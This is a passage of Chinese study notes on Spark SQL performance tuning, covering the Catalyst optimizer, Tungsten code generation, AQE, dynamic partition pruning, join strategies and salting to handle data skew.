<p>对于一些自定义的数据结构来说，如果你没有明确把这些类型向 Kryo Serializer 注册的话，虽然它依然会帮你做序列化的工作，但它序列化的每一条数据记录都会带一个类名字，这个类名字是通过反射机制得到的，会非常长。在上亿的样本中，存储开销自然相当可观。</p>
<p>我们只需要在 SparkConf 之上调用 registerKryoClasses 方法就好了。</p>
<h3 id="SparkSql性能调优"><a href="#SparkSql性能调优" class="headerlink" title="SparkSql性能调优"></a>SparkSql性能调优</h3><p><img src="https://static001.geekbang.org/resource/image/f3/72/f3ffb5fc43ae3c9bca44c1f4f8b7e872.jpg"></p>
<p><img src="https://static001.geekbang.org/resource/image/50/fc/505dbb1462dbc1f927fa1f4a2daabcfc.jpg"></p>
<h4 id="Catalyst逻辑计划"><a href="#Catalyst逻辑计划" class="headerlink" title="Catalyst逻辑计划"></a>Catalyst逻辑计划</h4><p>Catalyst 逻辑优化阶段分为两个环节：逻辑计划解析和逻辑计划优化。在逻辑计划解析中，Catalyst 把“Unresolved Logical Plan”转换为“Analyzed Logical Plan”；在逻辑计划优化中，Catalyst 基于一些既定的启发式规则（Heuristics Based Rules），把“Analyzed Logical Plan”转换为“Optimized Logical Plan”。</p>
<p><img src="https://static001.geekbang.org/resource/image/0e/a3/0efa02fd8eda5a69c794871ea77030a3.jpg"></p>
<h5 id="dsl"><a href="#dsl" class="headerlink" title="dsl"></a>dsl</h5><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> userFile: <span class="type">String</span> = _</span><br><span class="line"><span class="keyword">val</span> usersDf = spark.read.parquet(userFile)</span><br><span class="line">usersDf.printSchema</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">root</span></span><br><span class="line"><span class="comment">|-- userId: integer (nullable = true)</span></span><br><span class="line"><span class="comment">|-- name: string (nullable = true)</span></span><br><span class="line"><span class="comment">|-- age: integer (nullable = true)</span></span><br><span class="line"><span class="comment">|-- gender: string (nullable = true)</span></span><br><span class="line"><span class="comment">|-- email: string (nullable = true)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">val</span> users = usersDf</span><br><span class="line">.select(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;age&quot;</span>, <span class="string">&quot;userId&quot;</span>)</span><br><span class="line">.filter($<span class="string">&quot;age&quot;</span> &lt; <span class="number">30</span>)</span><br><span class="line">.filter($<span class="string">&quot;gender&quot;</span>.isin(<span class="string">&quot;M&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> txFile: <span class="type">String</span> = _</span><br><span class="line"><span class="keyword">val</span> txDf = spark.read.parquet(txFile)</span><br><span class="line">txDf.printSchema</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">root</span></span><br><span class="line"><span class="comment">|-- itemId: integer (nullable = true)</span></span><br><span class="line"><span class="comment">|-- userId: integer (nullable = true)</span></span><br><span class="line"><span class="comment">|-- price: float (nullable = true)</span></span><br><span class="line"><span class="comment">|-- quantity: integer (nullable = true)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> result = txDF.select(<span class="string">&quot;price&quot;</span>, <span class="string">&quot;volume&quot;</span>, <span class="string">&quot;userId&quot;</span>)</span><br><span class="line">.join(users, <span class="type">Seq</span>(<span class="string">&quot;userId&quot;</span>), <span class="string">&quot;inner&quot;</span>)</span><br><span class="line">.groupBy(col(<span class="string">&quot;name&quot;</span>), col(<span class="string">&quot;age&quot;</span>)).agg(sum(col(<span class="string">&quot;price&quot;</span>) * col(<span class="string">&quot;volume&quot;</span>)).alias(<span class="string">&quot;revenue&quot;</span>))</span><br><span class="line"></span><br><span class="line">result.write.parquet(<span class="string">&quot;_&quot;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="Unresolved-Logical-Plan"><a href="#Unresolved-Logical-Plan" class="headerlink" title="Unresolved Logical Plan"></a>Unresolved Logical Plan</h5><p><img src="https://static001.geekbang.org/resource/image/ff/80/fff906004736005de9c83cbfc09d8380.png"></p>
<h5 id="Analyzed-Logical-Plan"><a href="#Analyzed-Logical-Plan" class="headerlink" title="Analyzed Logical Plan"></a>Analyzed Logical Plan</h5><p><img src="https://static001.geekbang.org/resource/image/ac/7b/ac83f9d0cdab8655a5fffc9125a93f7b.png"></p>
<h5 id="Optimized-Logical-Plan"><a href="#Optimized-Logical-Plan" class="headerlink" title="Optimized Logical Plan"></a>Optimized Logical Plan</h5><p><img src="https://static001.geekbang.org/resource/image/72/df/7223829502eeeca0fbfb721c6a3b61df.png"></p>
<h4 id="Catalyst-的优化规则"><a href="#Catalyst-的优化规则" class="headerlink" title="Catalyst 的优化规则"></a>Catalyst 的优化规则</h4><p>可以归纳到以下 3 个范畴：</p>
<ul>
<li>谓词下推（Predicate Pushdown）</li>
<li>列剪裁（Column Pruning）</li>
<li>常量替换 （Constant Folding）</li>
</ul>
<h4 id="Cache-Manager-优化"><a href="#Cache-Manager-优化" class="headerlink" title="Cache Manager 优化"></a>Cache Manager 优化</h4><p>从“Analyzed Logical Plan”到“Optimized Logical Plan”的转换，Catalyst 除了使用启发式的规则以外，还会利用 Cache Manager 做进一步的优化。</p>
<p>这里的 Cache 指的就是我们常说的分布式数据缓存。想要对数据进行缓存，你可以调用 DataFrame 的.cache 或.persist，或是在 SQL 语句中使用“cache table”关键字。</p>
<p>当 Catalyst 尝试对逻辑计划做优化时，会先尝试对 Cache Manager 查找，看看当前的逻辑计划或是逻辑计划分支，是否已经被记录在 Cache Manager 的字典里。如果在字典中可以查到当前计划或是分支，Catalyst 就用 InMemoryRelation 节点来替换整个计划或是计划的一部分，从而充分利用已有的缓存数据做优化。</p>
<h4 id="Catalyst物理计划"><a href="#Catalyst物理计划" class="headerlink" title="Catalyst物理计划"></a>Catalyst物理计划</h4><p>为了把逻辑计划交付执行，Catalyst 还需要把 Optimized Logical Plan 转换为物理计划。物理计划比逻辑计划更具体，它明确交代了 Spark SQL 的每一步具体该怎么执行。</p>
<p>为了让查询计划（Query Plan）变得可操作、可执行，Catalyst 的物理优化阶段（Physical Planning）可以分为两个环节：优化 Spark Plan 和生成 Physical Plan。</p>
<ul>
<li>在优化 Spark Plan 的过程中，Catalyst 基于既定的优化策略（Strategies），把逻辑计划中的关系操作符一一映射成物理操作符，生成 Spark Plan。</li>
<li>在生成 Physical Plan 过程中，Catalyst 再基于事先定义的 Preparation Rules，对 Spark Plan 做进一步的完善、生成可执行的 Physical Plan。</li>
</ul>
<h5 id="优化-Spark-Plan"><a href="#优化-Spark-Plan" class="headerlink" title="优化 Spark Plan"></a>优化 Spark Plan</h5><p><img src="https://static001.geekbang.org/resource/image/73/a5/7312de5cf3yy06d6bc252c5923f163a5.png?wh=1920*658"></p>
<p>从 Optimized Logical Plan 摇身一变，转换成了 Spark Plan，也明确了在运行时采用 SMJ 来做关联计算。不过，即使小 Q 在 Spark Plan 中已经明确了每一步该“怎么做”，但是，Spark 还是做不到把这样的查询计划转化成可执行的分布式任务。</p>
<h5 id="生成-Physical-Plan"><a href="#生成-Physical-Plan" class="headerlink" title="生成 Physical Plan"></a>生成 Physical Plan</h5><p><img src="https://static001.geekbang.org/resource/image/65/33/656e29b2d25549488087fc1a4af8cd33.png?wh=1920*963"></p>
<p>现 Physical Plan 中多了很多星号“<em>”，这些星号的后面还带着括号和数字，如图中的“</em>（3）”、“<em>（1）”。这种星号“</em>”标记表示的就是 WSCG，后面的数字代表 Stage 编号。因此，括号中数字相同的操作，最终都会被捏合成一份“手写代码”，也就是我们下一讲要说的 Tungsten 的 WSCG。</p>
<p>Shuffle Sort Merge Join 的计算需要两个先决条件：Shuffle 和排序。而 Spark Plan 中并没有明确指定以哪个字段为基准进行 Shuffle，以及按照哪个字段去做排序。</p>
<p>因此，Catalyst 需要对 Spark Plan 做进一步的转换，生成可操作、可执行的 Physical Plan。</p>
<p><img src="https://static001.geekbang.org/resource/image/18/f7/187a85d53d585c5b3656353e3304fdf7.jpeg?wh=1857*923"></p>
<p>Preparation Rules 有 6 组规则，这些规则作用到 Spark Plan 之上就会生成 Physical Plan，而 Physical Plan 最终会由 Tungsten 转化为用于计算 RDD 的分布式任务。</p>
<h5 id="EnsureRequirements-规则"><a href="#EnsureRequirements-规则" class="headerlink" title="EnsureRequirements 规则"></a>EnsureRequirements 规则</h5><p>EnsureRequirements 翻译过来就是“确保满足前提条件”，这是什么意思呢？对于执行计划中的每一个操作符节点，都有 4 个属性用来分别描述数据输入和输出的分布状态。</p>
<p><img src="https://static001.geekbang.org/resource/image/f8/yf/f8cae1364372a2a8c034a5ab00850yyf.jpeg?wh=1313*546"></p>
<p>满足规则前</p>
<p><img src="https://static001.geekbang.org/resource/image/05/00/05467eecb3c983d4fc4a3db8a0e7e600.jpg?wh=2298*1764"></p>
<p>满足规则后</p>
<p><img src="https://static001.geekbang.org/resource/image/a8/15/a8c45d1d6ecb6a120205252e21b1b715.jpg?wh=2223*1725"></p>
<h4 id="钨丝计划：Tungsten"><a href="#钨丝计划：Tungsten" class="headerlink" title="钨丝计划：Tungsten"></a>钨丝计划：Tungsten</h4><p>Tungsten 又叫钨丝计划，它主要围绕内核引擎做了两方面的改进：数据结构设计和全阶段代码生成（WSCG，Whole Stage Code Generation）。</p>
<h5 id="Unsafe-Row：二进制数据结构"><a href="#Unsafe-Row：二进制数据结构" class="headerlink" title="Unsafe Row：二进制数据结构"></a>Unsafe Row：二进制数据结构</h5><p><img src="https://static001.geekbang.org/resource/image/51/2c/516c0e41e6757193533c8dfa33f9912c.jpg"></p>
<h5 id="基于内存页的内存管理"><a href="#基于内存页的内存管理" class="headerlink" title="基于内存页的内存管理"></a>基于内存页的内存管理</h5><p>为了统一管理 Off Heap 和 On Heap 内存空间，Tungsten 定义了统一的 128 位内存地址，简称 Tungsten 地址。Tungsten 地址分为两部分：前 64 位预留给 Java Object，后 64 位是偏移地址 Offset。但是，同样是 128 位的 Tungsten 地址，Off Heap 和 On Heap 两块内存空间在寻址方式上截然不同。</p>
<p><img src="https://static001.geekbang.org/resource/image/90/47/904dc1d1846dddffe363e834ce892347.jpg"></p>
<h6 id="java-util-HashMap"><a href="#java-util-HashMap" class="headerlink" title="java.util.HashMap"></a>java.util.HashMap</h6><p><img src="https://static001.geekbang.org/resource/image/1b/84/1bc7f9553dfe7yyb51a641f51093c284.jpg"></p>
<h6 id="Tungsten-HashMap"><a href="#Tungsten-HashMap" class="headerlink" title="Tungsten HashMap"></a>Tungsten HashMap</h6><p><img src="https://static001.geekbang.org/resource/image/4e/df/4e28d831e2b6f368f63907b82c5493df.jpg"></p>
<h4 id="火山迭代模型"><a href="#火山迭代模型" class="headerlink" title="火山迭代模型"></a>火山迭代模型</h4><p><img src="https://static001.geekbang.org/resource/image/f9/e6/f9350a3f71d20a11391a1101bf392be6.jpg"></p>
<p>如果上面的查询使用 VI 模型去执行计算的话，都需要经过哪些步骤呢？对于数据源中的每条数据条目，语法树当中的每个操作符都需要完成如下步骤：</p>
<ul>
<li>从内存中读取父操作符的输出结果作为输入数据</li>
<li>调用 hasNext、next 方法，以操作符逻辑处理数据，如过滤、投影、聚合等等</li>
<li>将处理后的结果以统一的标准形式输出到内存，供下游算子消费</li>
</ul>
<h4 id="WSCG"><a href="#WSCG" class="headerlink" title="WSCG"></a>WSCG</h4><p>WSCG 指的是基于同一 Stage 内操作符之间的调用关系，生成一份“手写代码”，真正把所有计算融合为一个统一的函数。</p>
<p><img src="https://static001.geekbang.org/resource/image/53/e7/5389b8bd80748dcc706b1c3c95ddbce7.jpg"></p>
<p>Spark Plan 在转换成 Physical Plan 之前，会应用一系列的 Preparation Rules。这其中很重要的一环就是 CollapseCodegenStages 规则，它的作用正是尝试为每一个 Stages 生成“手写代码”。</p>
<p>总的来说，手写代码的生成过程分为两个步骤：</p>
<ul>
<li>从父节点到子节点，递归调用 doProduce，生成代码框架从子节点到父节点，递归</li>
<li>调用 doConsume，向框架填充每一个操作符的运算逻辑</li>
</ul>
<p><img src="https://static001.geekbang.org/resource/image/68/2d/68cfc6aec121511303ccec179bd4a32d.jpg"></p>
<h3 id="Spark-3-0"><a href="#Spark-3-0" class="headerlink" title="Spark 3.0"></a>Spark 3.0</h3><h4 id="AQE-1"><a href="#AQE-1" class="headerlink" title="AQE"></a>AQE</h4><p>具体概念之前已经提到过了，重点说一下关于倾斜的处理。</p>
<p>自动倾斜处理的拆分操作也是在 Reduce 阶段执行的。在同一个 Executor 内部，本该由一个 Task 去处理的大分区，被 AQE 拆成多个小分区并交由多个 Task 去计算。这样一来，Task 之间的计算负载就可以得到平衡。但是，这并不能解决不同 Executors 之间的负载均衡问题。</p>
<p>我们来举个例子，假设有个 Shuffle 操作，它的 Map 阶段有 3 个分区，Reduce 阶段有 4 个分区。4 个分区中的两个都是倾斜的大分区，而且这两个倾斜的大分区刚好都分发到了 Executor 0。通过下图，我们能够直观地看到，尽管两个大分区被拆分，但横向来看，整个作业的主要负载还是落在了 Executor 0 的身上。Executor 0 的计算能力依然是整个作业的瓶颈，这一点并没有因为分区拆分而得到实质性的缓解。</p>
<p>另外，在数据关联的场景中，对于参与 Join 的两张表，我们暂且把它们记做数据表 1 和数据表 2，如果表 1 存在数据倾斜，表 2 不倾斜，那在关联的过程中，AQE 除了对表 1 做拆分之外，还需要对表 2 对应的数据分区做复制，来保证关联关系不被破坏。</p>
<p>如果现在问题变得更复杂了，左表拆出 M 个分区，右表拆出 N 各分区，那么每张表最终都需要保持 M x N 份分区数据，才能保证关联逻辑的一致性。当 M 和 N 逐渐变大时，AQE 处理数据倾斜所需的计算开销将会面临失控的风险。</p>
<p>总的来说，当应用场景中的数据倾斜比较简单，比如虽然有倾斜但数据分布相对均匀，或是关联计算中只有一边倾斜，我们完全可以依赖 AQE 的自动倾斜处理机制。但是，当我们的场景中数据倾斜变得复杂，比如数据中不同 Key 的分布悬殊，或是参与关联的两表都存在大量的倾斜，我们就需要衡量 AQE 的自动化机制与手工处理倾斜之间的利害得失。</p>
<h4 id="DPP"><a href="#DPP" class="headerlink" title="DPP"></a>DPP</h4><h5 id="分区剪裁"><a href="#分区剪裁" class="headerlink" title="分区剪裁"></a>分区剪裁</h5><p>如果过滤谓词中包含分区键，那么 Spark SQL 对分区表做扫描的时候，是完全可以跳过（剪掉）不满足谓词条件的分区目录，这就是分区剪裁。</p>
<p><img src="https://static001.geekbang.org/resource/image/ee/d9/ee84e71580dc5fc61d0a542fdfca57d9.jpg"></p>
<h5 id="动态分区剪裁"><a href="#动态分区剪裁" class="headerlink" title="动态分区剪裁"></a>动态分区剪裁</h5><p><img src="https://static001.geekbang.org/resource/image/a6/b2/a683004565a3dcc1abb72922319d67b2.jpg"></p>
<p>首先，过滤条件 users.type = ‘Head User’会帮助维度表过滤一部分数据。与此同时，维度表的 ID 字段也顺带着经过一轮筛选，如图中的步骤 1 所示。经过这一轮筛选之后，保留下来的 ID 值，仅仅是维度表 ID 全集的一个子集。</p>
<p>然后，在关联关系也就是 orders.userId = users.id 的作用下，过滤效果会通过 users 的 ID 字段传导到事实表的 userId 字段，也就是图中的步骤 2。这样一来，满足关联关系的 userId 值，也是事实表 userId 全集中的一个子集。把满足条件的 userId 作为过滤条件，应用（Apply）到事实表的数据源，就可以做到减少数据扫描量，提升 I/O 效率，如图中的步骤 3 所示。</p>
<p>在数据关联的场景中，开发者要想利用好动态分区剪裁特性，需要注意 3 点：</p>
<ul>
<li>事实表必须是分区表，并且分区字段必须包含 Join Key</li>
<li>动态分区剪裁只支持等值 Joins，不支持大于、小于这种不等值关联关系</li>
<li>维度表过滤之后的数据集，必须要小于广播阈值，因此，开发者要注意调整配置项 spark.sql.autoBroadcastJoinThreshold</li>
</ul>
<h3 id="join策略"><a href="#join策略" class="headerlink" title="join策略"></a>join策略</h3><p>到目前为止，数据关联总共有 3 种 Join 实现方式。按照出现的时间顺序，分别是嵌套循环连接（NLJ，Nested Loop Join ）、排序归并连接（SMJ，Shuffle Sort Merge Join）和哈希连接（HJ，Hash Join）。</p>
<h4 id="NLJ-的工作原理"><a href="#NLJ-的工作原理" class="headerlink" title="NLJ 的工作原理"></a>NLJ 的工作原理</h4><p><img src="https://static001.geekbang.org/resource/image/be/13/be0774ffca24f9c20caa2ef6bd88d013.jpg"></p>
<p>NLJ 是采用“嵌套循环”的方式来实现关联的。也就是说，NLJ 会使用内、外两个嵌套的 for 循环依次扫描外表和内表中的数据记录，判断关联条件是否满足，比如例子中的 orders.userId = users.id，如果满足就把两边的记录拼接在一起，然后对外输出。NLJ 算法的计算复杂度是 O(M * N)。</p>
<h4 id="SMJ-的工作原理"><a href="#SMJ-的工作原理" class="headerlink" title="SMJ 的工作原理"></a>SMJ 的工作原理</h4><p><img src="https://static001.geekbang.org/resource/image/e2/b2/e2a8f8d1b2572ff456fa83a3f25ccbb2.jpg"></p>
<p>SMJ 算法的计算复杂度为 O(M + N)。不过，SMJ 计算复杂度的降低，仰仗的是两张表已经事先排好序。要知道，排序本身就是一项非常耗时的操作，更何况，为了完成归并关联，参与 Join 的两张表都需要排序。</p>
<h4 id="HJ-的工作原理"><a href="#HJ-的工作原理" class="headerlink" title="HJ 的工作原理"></a>HJ 的工作原理</h4><p><img src="https://static001.geekbang.org/resource/image/5c/e4/5c81d814591eba9d08e6a3174ffe22e4.jpg"></p>
<p>HJ 的计算分为两个阶段，分别是 Build 阶段和 Probe 阶段。在 Build 阶段，基于内表，算法使用既定的哈希函数构建哈希表，如上图的步骤 1 所示。哈希表中的 Key 是 Join Key 应用（Apply）哈希函数之后的哈希值，表中的 Value 同时包含了原始的 Join Key 和 Payload。</p>
<p>在 Probe 阶段，算法遍历每一条数据记录，先是使用同样的哈希函数，以动态的方式（On The Fly）计算 Join Key 的哈希值。然后，用计算得到的哈希值去查询刚刚在 Build 阶段创建好的哈希表。如果查询失败，说明该条记录与维度表中的数据不存在关联关系；如果查询成功，则继续对比两边的 Join Key。如果 Join Key 一致，就把两边的记录进行拼接并输出，从而完成数据关联。</p>
<h4 id="分布式环境下的-Join"><a href="#分布式环境下的-Join" class="headerlink" title="分布式环境下的 Join"></a>分布式环境下的 Join</h4><p><img src="https://static001.geekbang.org/resource/image/e9/48/e9bf1720ac13289a9e49e0f33a334548.jpg"></p>
<p>从执行性能来说，6 种策略从上到下由弱变强。</p>
<h4 id="大表Join小表：广播变量容不下小表怎么办？"><a href="#大表Join小表：广播变量容不下小表怎么办？" class="headerlink" title="大表Join小表：广播变量容不下小表怎么办？"></a>大表Join小表：广播变量容不下小表怎么办？</h4><p>通常来说，大表与小表尺寸相差 3 倍以上，我们就将其归类为“大表 Join 小表”的计算场景。因此，大表 Join 小表，仅仅意味着参与关联的两张表尺寸悬殊。</p>
<p>BHJ 处理大表 Join 小表时的前提条件是，广播变量能够容纳小表的全量数据。但是，如果小表的数据量超过广播阈值，我们又该怎么办呢？</p>
<h5 id="案例-1：Join-Key-远大于-Payload"><a href="#案例-1：Join-Key-远大于-Payload" class="headerlink" title="案例 1：Join Key 远大于 Payload"></a>案例 1：Join Key 远大于 Payload</h5><p>在第一个案例中，大表 100GB、小表 10GB，它们全都远超广播变量阈值（默认 10MB）。因为小表的尺寸已经超过 8GB，在大于 8GB 的数据集上创建广播变量，Spark 会直接抛出异常，中断任务执行，所以 Spark 是没有办法应用 BHJ 机制的。那我们该怎么办呢？</p>
<p><img src="https://static001.geekbang.org/resource/image/1c/69/1c93475b8d2d5d18d6b49fb7a258db69.jpg"></p>
<p>我们完全可以基于现有的 Join Keys 去生成一个全新的数据列，它可以叫“Hash Key”。生成的方法分两步：</p>
<ul>
<li>把所有 Join Keys 拼接在一起，把性别、年龄、一直到小时拼接成一个字符串，如图中步骤 1、3 所示</li>
<li>使用哈希算法（如 MD5 或 SHA256）对拼接后的字符串做哈希运算，得到哈希值即为“Hash Key”，如上图步骤 2、4 所示</li>
</ul>
<p><img src="https://static001.geekbang.org/resource/image/bb/bf/bb79544467e98f9d2b6f13a437bb2dbf.jpg"></p>
<h5 id="案例-2：过滤条件的-Selectivity-较高"><a href="#案例-2：过滤条件的-Selectivity-较高" class="headerlink" title="案例 2：过滤条件的 Selectivity 较高"></a>案例 2：过滤条件的 Selectivity 较高</h5><p>这个时候我们就要用到 AQE 了，我们知道 AQE 允许 Spark SQL 在运行时动态地调整 Join 策略。我们刚好可以利用这个特性，把最初制定的 SMJ 策略转化为 BHJ 策略（千万别忘了，AQE 默认是关闭的，要想利用它提供的特性，我们得先把 spark.sql.adaptive.enabled 配置项打开）。</p>
<p>不过，即便过滤条件的选择性很高，在千分之一左右，过滤之后的维表还是有 20MB 大小，这个尺寸还是超过了默认值广播阈值 10MB。因此，我们还需要把广播阈值 spark.sql.autoBroadcastJoinThreshold 调高一些。</p>
<p>要想利用 DPP 机制，我们必须要让 orders 成为分区表，也就是做两件事情：</p>
<ul>
<li>创建一张新的订单表 orders_new，并指定 userId 为分区键</li>
<li>把原订单表 orders 的全部数据，灌进这张新的订单表 orders_new</li>
</ul>
<h5 id="案例-3：小表数据分布均匀"><a href="#案例-3：小表数据分布均匀" class="headerlink" title="案例 3：小表数据分布均匀"></a>案例 3：小表数据分布均匀</h5><p>当参与 Join 的两张表尺寸相差悬殊且小表数据分布均匀的时候，SHJ 往往比 SMJ 的执行效率更高。</p>
<p>这种情况下，我们不妨使用 Join Hints 来强制 Spark SQL 去选择 SHJ 策略进行关联计算。</p>
<h4 id="大表Join大表（一）：“分而治之”"><a href="#大表Join大表（一）：“分而治之”" class="headerlink" title="大表Join大表（一）：“分而治之”"></a>大表Join大表（一）：“分而治之”</h4><p>“分而治之”的调优思路是把“大表 Join 大表”降级为“大表 Join 小表”，然后使用上一讲中“大表 Join 小表”的调优方法来解决性能问题。它的核心思想是，先把一个复杂任务拆解成多个简单任务，再合并多个简单任务的计算结果。</p>
<p><img src="https://static001.geekbang.org/resource/image/b7/36/b7f69a554c2e5745625ea1aa969e0136.jpg"></p>
<h5 id="如何避免外表的重复扫描？"><a href="#如何避免外表的重复扫描？" class="headerlink" title="如何避免外表的重复扫描？"></a>如何避免外表的重复扫描？</h5><p>内表拆分之后，外表就要分别和所有的子表做关联，尽管每一个关联都变成了“大表 Join 小表”并转化为 BHJ，但是在 Spark 的运行机制下，每一次关联计算都需要重新、重头扫描外表的全量数据。毫无疑问，这样的操作是让人无法接受的。这就是“分而治之”中另一个关键的环节：外表的重复扫描。</p>
<p>有了DPP的帮助，我们方便了许多。</p>
<p><img src="https://static001.geekbang.org/resource/image/fa/23/fa4bfb52cb42928f15b1dc7c37c30b23.jpg"></p>
<p>不难发现，每个子查询只扫描外表的一部分、一个子集，所有这些子集加起来，刚好就是外表的全量数据。因此，利用“分而治之”的调优技巧，端到端的关联计算仅需对外表做一次完整的全量扫描即可。</p>
<h4 id="大表Join大表（二）：负隅顽抗"><a href="#大表Join大表（二）：负隅顽抗" class="headerlink" title="大表Join大表（二）：负隅顽抗"></a>大表Join大表（二）：负隅顽抗</h4><p>负隅顽抗指的是，当内表没法做到均匀拆分，或是外表压根就没有分区键，不能利用 DPP，只能依赖 Shuffle Join，去完成大表与大表的情况下，我们可以采用的调优方法和手段。</p>
<h5 id="数据分布均匀"><a href="#数据分布均匀" class="headerlink" title="数据分布均匀"></a>数据分布均匀</h5><p>这两个条件与数据表本身的尺寸无关，只与其是否分布均匀有关。不过，为了确保 Shuffle Hash Join 计算的稳定性，我们需要特别注意上面列出的第二个条件，也就是内表所有的数据分片都能够放入内存。</p>
<p>其实，只要处理好并行度、并发度与执行内存之间的关系，我们就可以让内表的每一个数据分片都恰好放入执行内存中。</p>
<h5 id="数据倾斜"><a href="#数据倾斜" class="headerlink" title="数据倾斜"></a>数据倾斜</h5><p><img src="https://static001.geekbang.org/resource/image/be/73/beb46de87f456924fc1414b93f8c0a73.jpeg"></p>
<p>学过 AQE 之后，要应对数据倾斜，想必你很快就会想到 AQE 的特性：自动倾斜处理。给定如下配置项参数，Spark SQL 在运行时可以将策略 OptimizeSkewedJoin 插入到物理计划中，自动完成 Join 过程中对于数据倾斜的处理。</p>
<p>有了 AQE 的自动倾斜处理特性，在应对数据倾斜问题的时候，我们确实能够大幅节省开发成本。不过，天下没有免费的午餐，AQE 的倾斜处理是以 Task 为粒度的，这意味着原本 Executors 之间的负载倾斜并没有得到根本改善。如下图。</p>
<p><img src="https://static001.geekbang.org/resource/image/f4/72/f4fe3149112466174bdefcc0ee573d72.jpg"></p>
<p>解决方法如下。</p>
<p>对于外表中所有的 Join Keys，我们先按照是否存在倾斜把它们分为两组。一组是存在倾斜问题的 Join Keys，另一组是分布均匀的 Join Keys。因为给定两组不同的 Join Keys，相应地我们把内表的数据也分为两份。</p>
<p>对于 Join Keys 分布均匀的数据部分，我们可以沿用把 Shuffle Sort Merge Join 转化为 Shuffle Hash Join 的方法。</p>
<p><img src="https://static001.geekbang.org/resource/image/c2/e2/c22de99104b0a9cb0d5cfdffebd42ee2.jpg"></p>
<p>对于 Join Keys 存在倾斜问题的数据部分，我们就需要借助“两阶段 Shuffle”的调优技巧，来平衡 Executors 之间的工作负载。</p>
<p><img src="https://static001.geekbang.org/resource/image/34/21/348ddabcd5f9980de114ae9d5b96d321.jpg"></p>
<p>外表的处理称作“随机加盐”，具体的操作方法是，对于任意一个倾斜的 Join Key，我们都给它加上 1 到 #N 之间的一个随机后缀。粒度使用executors的数量是一个不错的选择。</p>
<p>内表的处理称为“复制加盐”，具体的操作方法是，对于任意一个倾斜的 Join Key，我们都把原数据复制（#N – 1）份，从而得到 #N 份数据副本。</p>
<p>但这个手法有一个缺陷，如果Shuffle中涉及的聚合计算需要以排序为前提，那么加盐之后的优化手段，也就是“两阶段Shuffle”，可能会破坏原先的计算逻辑。</p>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p><img src="https://static001.geekbang.org/resource/image/94/b8/9436f0f9352ffa381b238be57d2ecdb8.jpeg"></p>
]]></content>
      <tags>
        <tag>Big Data</tag>
      </tags>
  </entry>
</search>
